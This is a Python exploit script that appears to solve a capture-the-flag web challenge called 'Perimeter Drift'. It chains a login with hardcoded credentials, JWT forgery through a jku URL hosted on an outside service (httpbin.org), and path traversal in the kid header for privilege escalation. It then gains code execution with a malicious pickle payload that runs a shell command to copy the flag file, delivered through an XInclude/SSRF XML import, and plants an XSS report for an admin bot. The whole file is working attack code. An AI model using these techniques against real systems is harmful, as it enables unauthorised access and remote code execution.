#!/usr/bin/env python3
"""
Perimeter Drift CTF - Direct Admin Login Solve
Uses hardcoded admin password from docker-compose.yml
"""
import base64
import hashlib
import hmac
import json
import re
import sys
import time
import urllib.parse

import requests

TARGET = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chall.0xfun.org:22702"

# Hardcoded creds from docker-compose.yml
ADMIN_USER = "olivia.admin"
ADMIN_PASS = "Olivia.Admin-2026!"
REVIEWER_USER = "isaac.reviewer"
REVIEWER_PASS = "Isaac.Reviewer-2026!"

HMAC_KEY = "mysecretkey"


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    si = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, si, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    return f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"


def make_pickle_payload():
    # Raw pickle opcodes for Linux (avoids Windows nt.system issue)
    return b"cos\nsystem\np0\n(S'cp /flag.txt /shared/loot/flag.txt'\np1\ntp2\nRp3\n."


def check_flag(s=None):
    try:
        r = (s or requests).get(f"{TARGET}/recovery/latest", timeout=10)
        return r.text.strip()
    except:
        return ""


def try_admin_login(s, username, password):
    """Try direct login with known credentials"""
    r = s.post(f"{TARGET}/login", data={"username": username, "password": password},
               allow_redirects=True, timeout=10)
    me = s.get(f"{TARGET}/api/me", timeout=10)
    if me.status_code == 200:
        try:
            return me.json()
        except:
            pass
    return None


def try_sso_login(s):
    """SSO JWT forgery login"""
    jku_url = make_jku_url()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
        "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
        "exp": now + 3600, "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True, timeout=30)
    r = s.get(f"{TARGET}/api/me", timeout=10)
    return r.json() if r.status_code == 200 else None


def escalate_reviewer(s):
    """Path traversal kid to escalate to reviewer"""
    known_key = b"XKEY"
    files = {"file": ("x.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files, timeout=10)
    if r.status_code != 200:
        return False
    fname = r.json().get("filename", "x.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    grant = forge_jwt(known_key, {"scope": "report:submit", "iat": int(time.time())},
                      {"kid": f"../review-materials/{kid_name}"})
    s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True, timeout=10)
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    return me.get("role") in ("reviewer", "admin")


def get_workspace_key_from_admin(s):
    """If we're admin, just load the admin page and extract workspace_key"""
    r = s.get(f"{TARGET}/admin", timeout=10)
    if r.status_code != 200:
        return None
    m = re.search(r'data-workspace-key="([^"]+)"', r.text)
    return m.group(1) if m else None


def do_rce(workspace_key):
    """Upload pickle payload + trigger XML import for RCE"""
    b64_payload = base64.b64encode(make_pickle_payload()).decode()
    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    r = requests.post(f"{TARGET}/admin/upload", files=files,
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    Upload: {r.status_code} {r.text}")

    xml = ('<doc sink="http://internal:9000/internal/import" '
           'xmlns:drift="http://www.w3.org/2001/XInclude">'
           '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/></doc>')
    r = requests.post(f"{TARGET}/admin/xml/import", data={"xml": xml},
                      headers={"X-Workspace-Key": workspace_key}, timeout=10)
    print(f"    XML import: {r.status_code} {r.text}")


def solve():
    print(f"Target: {TARGET}")
    print("=" * 60)

    # Check if flag already exists
    flag = check_flag()
    if "0xfun{" in flag:
        print(f"\nFLAG: {flag}")
        return

    # === APPROACH 1: Direct admin login ===
    print("\n[1] Trying direct admin login...")
    for uname, pwd in [
        ("olivia.admin", "Olivia.Admin-2026!"),
        ("admin", "Olivia.Admin-2026!"),
        ("olivia", "Olivia.Admin-2026!"),
    ]:
        s = requests.Session()
        me = try_admin_login(s, uname, pwd)
        if me:
            print(f"    -> Logged in as {me['username']} ({me['role']})")
            if me["role"] == "admin":
                wk = get_workspace_key_from_admin(s)
                if wk:
                    print(f"    workspace_key: {wk}")
                    print("\n[2] Pickle RCE...")
                    do_rce(wk)
                    time.sleep(3)
                    flag = check_flag(s)
                    print(f"\n{'='*60}")
                    print(f"FLAG: {flag}")
                    print(f"{'='*60}")
                    return
            break
        print(f"    {uname}: failed")

    # === APPROACH 2: Reviewer login ===
    print("\n[2] Trying reviewer login...")
    for uname, pwd in [
        ("isaac.reviewer", "Isaac.Reviewer-2026!"),
        ("isaac", "Isaac.Reviewer-2026!"),
    ]:
        s = requests.Session()
        me = try_admin_login(s, uname, pwd)
        if me:
            print(f"    -> Logged in as {me['username']} ({me['role']})")
            break
        print(f"    {uname}: failed")

    # === APPROACH 3: SSO + escalation + bot ===
    print("\n[3] SSO JWT forgery...")
    s = requests.Session()
    me = try_sso_login(s)
    if not me:
        print("    FAILED")
        return
    print(f"    -> {me['username']} ({me['role']})")

    if me["role"] == "researcher":
        print("\n[4] Reviewer escalation...")
        if not escalate_reviewer(s):
            print("    FAILED")
            return
    me = s.get(f"{TARGET}/api/me", timeout=10).json()
    print(f"    -> role: {me['role']}")

    # Search for bootstrap ticket (as reviewer, won't find it, but try)
    print("\n[5] Searching for bootstrap ticket...")
    r = s.get(f"{TARGET}/api/search", params={"q": "bt-"}, timeout=10)
    print(f"    Search 'bt-': {r.json()}")
    r = s.get(f"{TARGET}/api/search", params={"q": "bootstrap"}, timeout=10)
    print(f"    Search 'bootstrap': {r.json()}")
    r = s.get(f"{TARGET}/api/search", params={"q": "ticket"}, timeout=10)
    print(f"    Search 'ticket': {r.json()}")

    # Try to brute-force bootstrap ticket via /auth/bootstrap
    # (need admin role - won't work as reviewer, but let's try the endpoint)
    print("\n[6] Testing /auth/bootstrap access...")
    r = s.get(f"{TARGET}/auth/bootstrap", params={"ticket": "bt-0000"}, timeout=10)
    print(f"    Status: {r.status_code}")
    print(f"    Response: {r.text[:200]}")

    # Try to access admin page directly (will fail as reviewer)
    print("\n[7] Testing /admin access...")
    r = s.get(f"{TARGET}/admin", timeout=10, allow_redirects=False)
    print(f"    Status: {r.status_code}")

    # Create XSS report for bot chain
    print("\n[8] Creating XSS report...")
    body = '<form id="workspace-state"><input name="state" value=\'{"debug":true,"module":"ops/loader"}\'></form>'
    r = s.post(f"{TARGET}/reports/new", data={"title": "Assessment", "vuln_type": "XSS", "report": body},
               allow_redirects=True, timeout=10)
    m = re.search(r"/reports/(\d+)", r.url)
    rid = m.group(1) if m else "1"
    print(f"    Report ID: {rid}")

    # Submit bot with admin page directly (no bounce) + popup trick via external page
    print("\n[9] Submitting bot URLs...")

    # Try direct admin access (no bounce - will render but won't leak)
    for tb in ["http://web:5000", "http://host.docker.internal:22702"]:
        url = f"{tb}/admin"
        try:
            r = s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True, timeout=15)
            print(f"    [admin] {tb}: {r.status_code}")
        except Exception as e:
            print(f"    [admin] {tb}: {e}")

    print("\n[10] Info gathered. Manual steps needed:")
    print(f"    Report ID: {rid}")
    print(f"    Bot URL template: http://web:5000/reports/{rid}?view=../../assets/admin/roles&ticket=bt-XXXX&cb=CALLBACK")
    print(f"    Need bootstrap ticket (bt-XXXX) or external hosting for popup exploit")

    flag = check_flag(s)
    if "0xfun{" in flag:
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print(f"\nRecovery: {flag}")


if __name__ == "__main__":
    solve()
